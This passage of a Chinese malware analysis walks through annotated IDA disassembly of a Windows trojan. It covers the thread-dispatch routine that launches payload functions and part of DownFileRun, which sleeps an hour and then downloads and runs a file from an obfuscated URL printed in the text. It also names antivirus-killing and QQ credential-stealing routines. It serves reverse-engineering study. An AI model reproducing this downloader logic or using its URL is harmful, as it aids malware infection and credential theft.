
```
PEp0:00404996      mov eax, [ebp+arg_0]     ; 取参数地址
PEp0:00404999      push eax
PEp0:0040499A      lea eax, [edi+8]
PEp0:0040499D      push eax
PEp0:0040499E      mov ecx, offset CallMainExitThread ; 结束本线程的代码
PEp0:004049A3      xor edx, edx
PEp0:004049A5      xor eax, eax
PEp0:004049A7      call CallCreateThread    ; 创建线程，并将上述结束自己线程的代码地址以线程回调函数的参数传入
。。。。。。。。。。。。。。。
PEp0:004049CA CreateThreadCallFun endp
```

`CallCreateThread` 函数的作用就是开新线程，参数 `lpParameter` 就是上述 `CallMainExitThread` 函数的地址：

```
PEp0:00403B44 CallCreateThread proc near    ; CODE XREF: CreateThreadCallFun+3B p
。。。。。。。。。。。。。。。。。。。。。。。。。。              ;
PEp0:00403B4A      mov edi, ecx             ; 结束线程函数地址
PEp0:00403B4C      mov esi, edx
PEp0:00403B4E      mov ebx, eax
PEp0:00403B50      mov eax, 8
PEp0:00403B55      call sub_4024FC
PEp0:00403B5A      mov [eax], edi           ; 将结束自身的代码地址放到[eax]中
PEp0:00403B5C      mov edx, [ebp+arg_8]     ; 取参数也就是该函数调用方传递的edi的值，其中edi+14h去内容就是主体函数地址
PEp0:00403B5F      mov [eax+4], edx         ; 将edx保存到[eax+4]的位置，然后在结束自身和调用主体函数的时候恢复
PEp0:00403B62      mov byte_40D035, 1
PEp0:00403B69      mov edx, [ebp+lpThreadId]
PEp0:00403B6C      push edx                 ; lpThreadId
PEp0:00403B6D      mov edx, [ebp+dwCreationFlags]
PEp0:00403B70      push edx                 ; dwCreationFlags
PEp0:00403B71      push eax                 ; lpParameter
PEp0:00403B72      mov eax, offset StartAddress
PEp0:00403B77      push eax                 ; lpStartAddress
PEp0:00403B78      push esi                 ; dwStackSize
PEp0:00403B79      push ebx                 ; lpThreadAttributes
PEp0:00403B7A      call CreateThread        ; 参数lpParameter也就是eax取内容为00404900
                   …………..
PEp0:00403B83 CallCreateThread endp
```

线程回调函数 `StartAddress` 主要赋值然后调用 `CallMainExitThread`

```
PEp0:00403B0C ; DWORD __stdcall StartAddress(LPVOID)
PEp0:00403B0C StartAddress proc near        ; DATA XREF: CallCreateThread+2E o
。。。。。。。。。。。。。。。。。。。。。。
PEp0:00403B23      mov eax, [ebp+arg_0]     ; 取线程回调函数的参数，本次调试这里对其取内容为00404900
PEp0:00403B26      mov ecx, [eax+4]         ; 这里恢复00404992地址代码中的edi到这里的ecx
PEp0:00403B29      mov edx, [eax]           ; 以eax中的值为地址，取内容赋edx,这里是00404900
PEp0:00403B2B      push ecx
PEp0:00403B2C      push edx
PEp0:00403B2D      call sub_40251C
PEp0:00403B32      pop edx
PEp0:00403B33      pop eax                  ; 将ecx的值放入eax
PEp0:00403B34      call edx                 ; 调用00404900中的代码即调用CallMainExitThread
PEp0:00403B3F StartAddress endp
```

`CallMainExitThread` 函数就是动态 `DownFileRun` 等函数，并将自身线程终止。

```
PEp0:00404900 CallMainExitThread proc near  ; DATA XREF: CreateThreadCallFun+32 o
。。。。。。。。。。。。。。。。。。
PEp0:00404907     mov [ebp+var_4], eax    ; 将00404992地址代码中的edi值放到到这里
PEp0:0040490A      mov eax, [ebp+var_4]
PEp0:0040490D      mov byte ptr [eax+10h], 0
PEp0:00404911      xor eax, eax
PEp0:00404913      push ebp
PEp0:00404914      push offset loc_40495F
PEp0:00404919      push dword ptr fs:[eax]
PEp0:0040491C      mov fs:[eax], esp
PEp0:0040491F     mov ebx, [ebp+var_4]     ; 将00404992地址代码中的edi到这里的ebx
PEp0:00404922      mov eax, [ebp+var_4]
PEp0:00404925      call dword ptr [ebx+14h] ; 由于在00404992地址代码edi+14h取内容是主体函数地址，故这里调用如DownFileRun
PEp0:00404928      xor eax, eax
PEp0:0040492A      pop edx
PEp0:0040492B      pop ecx
PEp0:0040492C      pop ecx
PEp0:0040492D      mov fs:[eax], edx
PEp0:00404930      push offset loc_404966
PEp0:00404935 loc_404935:                   ; CODE XREF: PEp0:00404964 j
PEp0:00404935      lea eax, [ebp+dwExitCode]
PEp0:00404938      push eax                 ; lpExitCode
PEp0:00404939      mov eax, [ebp+var_4]
PEp0:0040493C      mov eax, [eax+4]
PEp0:0040493F      push eax                 ; hThread
PEp0:00404940      call GetExitCodeThread
PEp0:00404945      mov eax, [ebp+var_4]
PEp0:00404948      mov edx, [ebp+dwExitCode]
PEp0:0040494B      mov [eax+0Ch], edx
PEp0:0040494E      mov eax, [ebp+var_4]
PEp0:00404951      mov byte ptr [eax+10h], 1
PEp0:00404955      mov eax, [ebp+dwExitCode]
PEp0:00404958      push eax                 ; dwExitCode
PEp0:00404959      call ExitThread
PEp0:00404959 CallMainExitThread endp
```

下面是类似函数 `DownFileRun`，`CloseHUJL`，`KillAntiVirus`，`KillQQProcess`，`ReyOfAntiViu`，`DelKeyGetQQ` 的具体实现部分

---

`DownFileRun` 的作用就是下载文件并执行，其中下载链接为 `ba5K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3q4D9j5i4q4I4x3e0N6W2i4K6u0W2x3K6x3J5x3W2)9J5k6h3!0J5k6#2)9J5c8X3&6W2N6#2)9J5k6h3A6H3k6#2!0q4c8W2!0n7b7#2)9^5b7#2!0q4y4q4!0n7z5q4)9^5b7W2!0q4z5q4!0n7c8q4!0n7c8q4!0q4y4g2)9^5z5q4!0n7x3r3y4Q4x3@1q4Q4y4f1y4F1k6i4N6Q4x3X3g2W2P5r3g2Q4c8e0y4Q4z5o6m8Q4z5o6u0Q4c8e0W2Q4z5e0y4Q4b7V1g2Q4c8e0k6Q4z5p5g2Q4b7e0g2Q4c8e0g2Q4z5e0u0Q4z5p5y4Q4c8e0g2Q4z5e0m8Q4z5p5c8Q4c8e0g2Q4b7f1c8Q4z5e0N6Q4c8e0W2Q4z5o6y4Q4b7V1c8Q4c8e0S2Q4b7e0u0Q4b7f1u0Q4c8e0g2Q4z5p5q4Q4b7e0m8Q4c8e0g2Q4b7f1k6Q4z5o6k6Q4c8e0g2Q4z5f1y4Q4b7e0S2Q4c8e0k6Q4z5o6W2Q4b7e0N6Q4c8e0S2Q4b7e0q4Q4z5p5y4Q4c8e0N6Q4z5f1q4Q4z5o6c8Q4c8e0S2Q4b7V1k6Q4z5o6N6Q4c8e0N6Q4b7e0S2Q4z5p5u0Q4c8e0c8Q4b7U0S2Q4b7f1c8Q4c8e0S2Q4b7e0N6Q4b7e0y4Q4c8e0g2Q4b7V1y4Q4z5o6m8Q4c8e0y4Q4z5o6m8Q4z5o6u0Q4c8e0S2Q4b7V1k6Q4z5e0S2Q4c8e0k6Q4z5f1y4Q4z5o6W2Q4c8e0c8Q4b7U0S2Q4z5p5u0Q4c8e0S2Q4b7V1c8Q4b7V1c8Q4c8e0g2Q4z5o6W2Q4z5p5c8Q4c8e0k6Q4z5f1y4Q4z5o6W2Q4c8e0c8Q4b7U0S2Q4z5o6m8Q4c8e0c8Q4b7U0S2Q4b7f1q4Q4c8e0g2Q4b7U0m8Q4z5p5k6Q4c8e0k6Q4z5e0N6Q4b7U0k6Q4c8e0N6Q4z5f1q4Q4z5o6c8Q4c8e0k6Q4b7V1c8Q4z5f1y4Q4c8e0c8Q4b7V1y4Q4z5p5k6Q4c8e0c8Q4b7V1q4Q4z5e0c8Q4c8e0g2Q4z5o6S2Q4z5o6k6Q4c8e0W2Q4z5e0u0Q4z5f1k6Q4c8e0g2Q4z5e0m8Q4z5p5g2Q4c8e0g2Q4z5o6k6Q4z5p5c8Q4c8e0k6Q4z5o6W2Q4b7e0N6Q4c8e0S2Q4b7e0q4Q4z5p5y4Q4c8e0y4Q4z5o6m8Q4z5o6u0Q4c8e0N6Q4z5e0c8Q4b7U0q4Q4c8e0c8Q4b7V1q4Q4z5p5g2Q4c8e0S2Q4b7f1k6Q4b7e0g2Q4c8e0W2Q4z5e0y4Q4b7V1g2Q4c8e0k6Q4z5p5g2Q4b7e0g2Q4c8e0g2Q4b7U0N6Q4b7U0u0Q4c8e0N6Q4b7V1u0Q4z5p5k6Q4c8e0g2Q4b7e0c8Q4b7U0q4Q4c8e0k6Q4z5e0g2Q4z5o6S2Q4c8e0k6Q4z5e0g2Q4z5o6g2Q4c8e0c8Q4b7U0S2Q4z5p5c8Q4c8e0N6Q4z5f1k6Q4b7e0g2Q4c8e0W2Q4z5o6q4Q4z5e0y4Q4c8e0S2Q4b7V1k6Q4z5e0W2Q4c8e0W2Q4z5o6N6Q4z5p5y4Q4c8e0c8Q4b7U0S2Q4z5p5u0Q4c8e0S2Q4b7V1c8Q4b7V1c8Q4c8e0N6Q4z5f1q4Q4z5o6c8Q4c8e0k6Q4z5e0S2Q4b7f1k6Q4c8e0c8Q4b7V1u0Q4z5o6m8Q4c8e0c8Q4b7U0W2Q4z5o6S2Q4c8e0k6Q4z5e0k6Q4z5o6N6Q4c8e0c8Q4b7V1u0Q4b7U0k6Q4c8e0y4Q4z5o6m8Q4z5o6t1`。

```
PEp0:0040AC7C DownFileRun     proc near               ; DATA XREF:
。。。。。。。。。。。。。。。。。。。。
PEp0:0040AC97                 push    36EE80h         ; dwMilliseconds
PEp0:0040AC9C                 call    Sleep           ; 睡眠一小时
PEp0:0040ACA1                 mov     eax, offset byte_40D79C
PEp0:0040ACA6                 mov     edx, offset asc_40AD88 ; " "
PEp0:0040ACAB                 call    sub_403BDC
PEp0:0040ACB0                 mov     eax, offset byte_40D79C
PEp0:0040ACB5                 mov     edx, offset asc_40AD88 ; " "
PEp0:0040ACBA                 call    sub_403BDC
PEp0:0040ACBF                 lea     edx, [ebp+var_8]
PEp0:0040ACC2       mov     eax, offset aTrmXs@mirpjhoh ; "TRm]XS@mIrPjHoHnH^ukXbX"
PEp0:0040ACC7                 call    RevertString
PEp0:0040ACCC                 mov     eax, [ebp+var_8]
PEp0:0040ACCF                 lea     edx, [ebp+var_4]
PEp0:0040ACD2                 call    CallWSAStrart   ; 初始化网络
PEp0:0040ACD7                 lea     edx, [ebp+var_C]
PEp0:0040ACDA                 mov     eax, offset aHntmg_@jhl ; "HNtmG_@jHL"
PEp0:0040ACDF                 call    RevertString    ; 还原字符串
PEp0:0040ACE4                 mov     edx, [ebp+var_C]
PEp0:0040ACE7                 mov     eax, [ebp+var_4]
PEp0:0040ACEA                 call    sub_403E4C
PEp0:0040ACEF                 jz      short loc_40AD57
PEp0:0040ACF1                 xor     ebx, ebx
PEp0:0040ACF3                 mov     esi, 0Bh
PEp0:0040ACF8 loc_40ACF8:                             ; CODE XREF:
PEp0:0040ACF8                 lea     edx, [ebp+var_10]
```
